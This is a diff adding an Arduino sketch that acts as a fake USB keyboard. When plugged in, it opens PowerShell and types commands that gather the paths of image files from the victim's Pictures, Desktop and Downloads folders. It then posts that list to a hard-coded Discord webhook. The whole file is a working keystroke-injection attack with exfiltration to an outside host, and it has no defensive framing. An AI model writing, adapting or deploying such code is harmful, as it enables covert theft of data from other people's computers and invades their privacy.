@@ -1,0 +1,93 @@
+#include "Keyboard.h"
+
+const char* WEBHOOK = "https://discordapp.com/api/webhooks/1522970621590503564/wDRZSehRWlMbVRleaXT9YE1BFJpv9ujhvY9EoVYvpTYOByPE_momTb3yYLXt7IRbPQ-g";
+
+// Type a string with Shift+4 for dollar signs (still needed for non-US layouts)
+void typeCmd(const char* str) {
+  while (*str) {
+    if (*str == '$') {
+      Keyboard.press(KEY_LEFT_SHIFT);
+      Keyboard.write('4');
+      delay(5);
+      Keyboard.release(KEY_LEFT_SHIFT);
+    } else {
+      Keyboard.write(*str);
+    }
+    str++;
+    delay(5);  // slight delay for reliability
+  }
+}
+
+// Type a new line (Enter)
+void pressEnter() {
+  Keyboard.write(KEY_RETURN);
+  delay(300);
+}
+
+void setup() {
+  pinMode(LED_BUILTIN, OUTPUT);
+  Keyboard.begin();
+  delay(3000);  // wait for host to recognize USB
+
+  // ---------- Step 1: Open PowerShell ----------
+  // Win+R, type "powershell", Enter
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.print("powershell");
+  delay(200);
+  pressEnter();
+  delay(2000);  // wait for PowerShell window to fully open
+
+  // ---------- Step 2: Type the script line by line ----------
+  // This is exactly what you would paste into a PowerShell console.
+
+  // Line 1: webhook variable
+  typeCmd("$d='");
+  Keyboard.print(WEBHOOK);   // safe: webhook contains no special characters that need escaping
+  typeCmd("'");
+  pressEnter();
+
+  // Line 2: define paths
+  typeCmd("$p=@(\"$env:USERPROFILE\\Pictures\",\"$env:USERPROFILE\\Desktop\",\"$env:USERPROFILE\\Downloads\")");
+  pressEnter();
+
+  // Line 3: initialize list
+  typeCmd("$l=''");
+  pressEnter();
+
+  // Line 4-8: foreach loop (typed as a single line or multi-line; PowerShell accepts multi-line input)
+  // We'll break it into typed lines for readability, but we can also type it as one line.
+  // Better to type it as one continuous command to avoid ">>" continuation prompt, but PowerShell
+  // will accept a multi-line script block if we finish with a closing brace.
+  // We'll type the whole loop as one line to be safe:
+
+  typeCmd("foreach($i in $p){if(Test-Path $i){Get-ChildItem -Path $i -Recurse -Include @('*.jpg','*.jpeg','*.png','*.gif','*.bmp') -ErrorAction SilentlyContinue | Select-Object -First 10 | %{$l+=$_.FullName+\"`n\"}}}");
+  pressEnter();
+
+  // Line 9: check if list not empty and send
+  typeCmd("if($l){$b=@{content=$l}|ConvertTo-Json;Invoke-RestMethod -Uri $d -Method Post -Body $b -ContentType 'application/json'}");
+  pressEnter();
+
+  // Optionally, type "exit" to close the window
+  Keyboard.print("exit");
+  pressEnter();
+
+  // Blink LED to signal done
+  pinMode(LED_BUILTIN, OUTPUT);
+  for (int i = 0; i < 6; i++) {
+    digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN));
+    delay(200);
+  }
+
+  Keyboard.end();
+}
+
+void loop() {
+  digitalWrite(LED_BUILTIN, HIGH);
+  delay(1000);
+  digitalWrite(LED_BUILTIN, LOW);
+  delay(1000);
+}
